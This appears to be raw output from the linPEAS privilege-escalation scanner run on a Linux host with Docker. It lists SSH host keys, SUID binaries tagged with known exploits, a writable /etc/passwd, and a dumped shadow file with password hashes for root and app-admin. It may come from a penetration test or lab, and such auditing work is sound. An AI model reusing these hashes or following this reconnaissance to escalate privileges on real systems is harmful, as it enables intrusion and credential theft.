lrwxrwxrwx 1 root root 54 Feb 13 23:04 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub -> ../alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/etc/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/etc/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub
lrwxrwxrwx 1 root root 54 Aug  7  2023 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelinux.org-58199dcc.rsa.pub -> ../alpine-devel@lists.alpinelinux.org-58199dcc.rsa.pub
lrwxrwxrwx 1 root root 54 Aug  7  2023 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelinux.org-616ae350.rsa.pub -> ../alpine-devel@lists.alpinelinux.org-616ae350.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-524d27bb.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58199dcc.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58cbb476.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58e4f17d.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5e69ca50.rsa.pub
-rw-r--r-- 1 root root 451 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-60ac2099.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616a9724.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616abc23.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616ac3bc.rsa.pub
-rw-r--r-- 1 root root 800 Oct 18  2021 /var/lib/docker/overlay2/153a3ab925d9da496a66a25ca447a71477c998a7f5b1ce9c28f84d0b2f9857cc/diff/usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616adfeb.rsa.pub

UsePAM yes
ICMP is not accessible

══╣ Possible private SSH keys were found!
/etc/ssh/ssh_host_ed25519_key
/etc/ssh/ssh_host_ecdsa_key
/etc/ssh/ssh_host_rsa_key

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                                                                                                  
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
52902PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent.socket                                                                                                                                                                                     
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/logcheck/ignore.d.server/gpg-agent
/etc/X11/Xsession.d/90gpg-agent
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                                                                       
tmux 3.4                                                                                                                                                                                                                                    


/tmp/tmux-0



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                      
-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 51K Dec  5  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 39K Dec  5  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 55K Dec  5  2024 /usr/bin/su
-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 160K Oct 11  2024 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 67K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                                                                                                    
-rwsr-xr-x 1 root root 87K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/gpasswd
-rwsr-xr-x 1 root root 48K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 28  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/chsh
-rwsr-xr-x 1 root root 35K Mar 28  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 28  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/su
-rwsr-xr-x 1 root root 62K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 67K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                                                                                                    
-rwsr-xr-x 1 root root 87K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/gpasswd
-rwsr-xr-x 1 root root 48K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Nov 21  2024 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/chsh
-rwsr-xr-x 1 root root 35K Nov 21  2024 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Nov 21  2024 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/su
-rwsr-xr-x 1 root root 62K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 67K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                                                                                                  
-rwsr-xr-x 1 root root 87K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/gpasswd
-rwsr-xr-x 1 root root 48K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Nov 21  2024 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/chsh
-rwsr-xr-x 1 root root 35K Nov 21  2024 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Nov 21  2024 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/su
-rwsr-xr-x 1 root root 62K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/chfn  --->  SuSE_9.3/10

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwxr-sr-x 1 root _ssh 303K Apr 22 11:51 /usr/bin/ssh-agent                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 27K May 30  2024 /usr/bin/expiry
-rwxr-sr-x 1 root plocate 307K Apr 18  2024 /usr/bin/plocate (Unknown SGID binary)
-rwxr-sr-x 1 root crontab 39K Feb 16 21:04 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K May 30  2024 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31K May  2  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 27K May  2  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 15K Feb 16 21:04 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 31K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/expiry
-rwxr-sr-x 1 root shadow 79K Mar 23  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/bin/chage
-rwxr-sr-x 1 root shadow 39K Sep 21  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 31K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/expiry
-rwxr-sr-x 1 root shadow 79K Mar 23  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/bin/chage
-rwxr-sr-x 1 root shadow 39K Sep 21  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 31K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/expiry
-rwxr-sr-x 1 root shadow 79K Mar 23  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/bin/chage
-rwxr-sr-x 1 root shadow 39K Sep 21  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                                                                      
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
══╣ Current shell capabilities                                                                                                                                                                                                              
./linpeas.sh: 7520: [[: not found                                                                                                                                                                                                           
CapInh:  [Invalid capability format]
./linpeas.sh: 7520: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7511: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7520: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7520: [[: not found
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 7545: [[: not found                                                                                                                                                                                                           
CapInh:  [Invalid capability format]
./linpeas.sh: 7545: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7536: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7545: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7545: [[: not found
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
                                                                                                                                                                                                                                            
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3448 Feb 16 21:04 usr.bin.man                                                                                                                                                                                       
-rw-r--r-- 1 root root  1687 Feb 16 21:04 usr.bin.tcpdump
-rw-r--r-- 1 root root 31789 Oct 11  2024 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1508 Feb 16 21:04 usr.sbin.rsyslogd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                                                                                                                                                                           
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. root:$y$j9T$zQb8jNeWW3012FmWYEL0d/$U.8fkg.tLcvy9i.aIe3pQcR2LGAJtp/2IWcB7aDhMf.:20227:0:99999:7:::                                                                                                 
daemon:*:20135:0:99999:7:::
bin:*:20135:0:99999:7:::
sys:*:20135:0:99999:7:::
sync:*:20135:0:99999:7:::
games:*:20135:0:99999:7:::
man:*:20135:0:99999:7:::
lp:*:20135:0:99999:7:::
mail:*:20135:0:99999:7:::
news:*:20135:0:99999:7:::
uucp:*:20135:0:99999:7:::
proxy:*:20135:0:99999:7:::
www-data:*:20135:0:99999:7:::
backup:*:20135:0:99999:7:::
list:*:20135:0:99999:7:::
irc:*:20135:0:99999:7:::
_apt:*:20135:0:99999:7:::
nobody:*:20135:0:99999:7:::
systemd-network:!*:20135::::::
systemd-timesync:!*:20135::::::
dhcpcd:!:20135::::::
messagebus:!:20135::::::
systemd-resolve:!*:20135::::::
pollinate:!:20135::::::
polkitd:!*:20135::::::
syslog:!:20135::::::
uuidd:!:20135::::::
tcpdump:!:20135::::::
tss:!:20135::::::
landscape:!:20135::::::
fwupd-refresh:!*:20135::::::
usbmux:!:20209::::::
app-admin:$6$eWbk2vZL/QYmUqEO$d8XNwYi5bx/YmS8DR1N3Wjyl.ZR2tbaKB3o4yChrZkh41olnp50Gwk2lkOJ2POhmJ8/FMIh59Xg9iTCtlk/gK0:20209:0:99999:7:::
dnsmasq:!:20209::::::
sshd:!:20210::::::
root:*:20135:0:99999:7:::
daemon:*:20135:0:99999:7:::
bin:*:20135:0:99999:7:::
sys:*:20135:0:99999:7:::
sync:*:20135:0:99999:7:::
games:*:20135:0:99999:7:::
man:*:20135:0:99999:7:::
lp:*:20135:0:99999:7:::
mail:*:20135:0:99999:7:::
news:*:20135:0:99999:7:::
uucp:*:20135:0:99999:7:::
proxy:*:20135:0:99999:7:::
www-data:*:20135:0:99999:7:::
backup:*:20135:0:99999:7:::
list:*:20135:0:99999:7:::
irc:*:20135:0:99999:7:::
_apt:*:20135:0:99999:7:::
nobody:*:20135:0:99999:7:::
systemd-network:!*:20135::::::
systemd-timesync:!*:20135::::::
dhcpcd:!:20135::::::
messagebus:!:20135::::::
systemd-resolve:!*:20135::::::
pollinate:!:20135::::::
polkitd:!*:20135::::::
syslog:!:20135::::::
uuidd:!:20135::::::
tcpdump:!:20135::::::
tss:!:20135::::::
landscape:!:20135::::::
fwupd-refresh:!*:20135::::::
usbmux:!:20209::::::
app-admin:$6$eWbk2vZL/QYmUqEO$d8XNwYi5bx/YmS8DR1N3Wjyl.ZR2tbaKB3o4yChrZkh41olnp50Gwk2lkOJ2POhmJ8/FMIh59Xg9iTCtlk/gK0:20209:0:99999:7:::
dnsmasq:!:20209::::::
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::syslog,app-admin
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::app-admin
floppy:*::
tape:*::
sudo:*::
audio:*::
dip:*::app-admin
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
shadow:*::
utmp:*::
video:*::
sasl:*::
plugdev:*::app-admin
staff:*::
games:*::
users:*::
nogroup:*::
systemd-journal:!*::
systemd-network:!*::
systemd-timesync:!*::
input:!*::
sgx:!*::
kvm:!*::
render:!*::
lxd:!::app-admin
messagebus:!::
systemd-resolve:!*::
_ssh:!::
polkitd:!*::
crontab:!*::
syslog:!::
uuidd:!::
rdma:!::
tcpdump:!::
tss:!::
landscape:!::
fwupd-refresh:!*::
app-admin:!::
docker:!::
plocate:!::
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::syslog,app-admin
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::app-admin
floppy:*::
tape:*::
sudo:*::app-admin
audio:*::
dip:*::app-admin
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
shadow:*::
utmp:*::
video:*::
sasl:*::
plugdev:*::app-admin
staff:*::
games:*::
users:*::
nogroup:*::
systemd-journal:!*::
systemd-network:!*::
systemd-timesync:!*::
input:!*::
sgx:!*::
kvm:!*::
render:!*::
lxd:!::app-admin
messagebus:!::
systemd-resolve:!*::
_ssh:!::
polkitd:!*::
crontab:!*::
syslog:!::
uuidd:!::
rdma:!::
tcpdump:!::
tss:!::
landscape:!::
fwupd-refresh:!*::
app-admin:!::
docker:!::
plocate:!::
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. ═╣ Can I write in network-scripts? ...... No                                                                                                                                                      
═╣ Can I read root folder? .............. total 52                                                                                                                                                                                          
drwx------  8 root root 4096 Jul 19 09:22 .
drwxr-xr-x 24 root root 4096 May 19 11:16 ..
drwxr-xr-x  2 root root 4096 May 12 09:39 app2
-rw-------  1 root root    0 May 31 07:54 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  3 root root 4096 Jul 19 09:22 .gnupg
drwxr-xr-x  4 root root 4096 May 12 08:29 hot
-rw-------  1 root root   20 May 12 07:56 .lesshst
drwxr-xr-x  3 root root 4096 May  1 10:37 .local
drwxr-xr-x  4 root root 4096 May 12 08:40 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-------  1 root root   16 Jul 19 09:10 .python_history
drwx------  2 root root 4096 May  1 10:31 .ssh
-rw-------  1 root root 1468 Jul 19 09:07 .viminfo

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/
/root/.viminfo
/root/.bash_history
/root/hot
/root/hot/README.md
/root/hot/server
/root/hot/server/package.json
/root/hot/server/debug.sh
/root/hot/server/build.sh
/root/hot/server/nodemon.json
/root/hot/server/Dockerfile
/root/hot/server/.gitignore
/root/hot/server/.dockerignore
/root/hot/server/src
/root/hot/server/src/env.js
/root/hot/server/src/middleware.js
/root/hot/server/src/helpers
/root/hot/server/src/helpers/helpers.js
/root/hot/server/src/rssParser.js
/root/hot/server/src/pluginManager.js
/root/hot/server/src/apinext.js
/root/hot/server/src/database.js
/root/hot/server/src/plugins
/root/hot/server/src/plugins/email.js
/root/hot/server/src/plugins/gmail.js
/root/hot/server/src/plugins/email.src
/root/hot/server/src/plugins/email.src/package.json
/root/hot/server/src/plugins/email.src/email.src.js
/root/hot/server/src/plugins/email.src/webpack.config.js



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/bin/rescan-scsi-bus.sh                                                                                                                                                                                                                 
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/etc/resolv.conf                                                                                             
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/etc/hosts
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/.dockerenv
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/dev/console
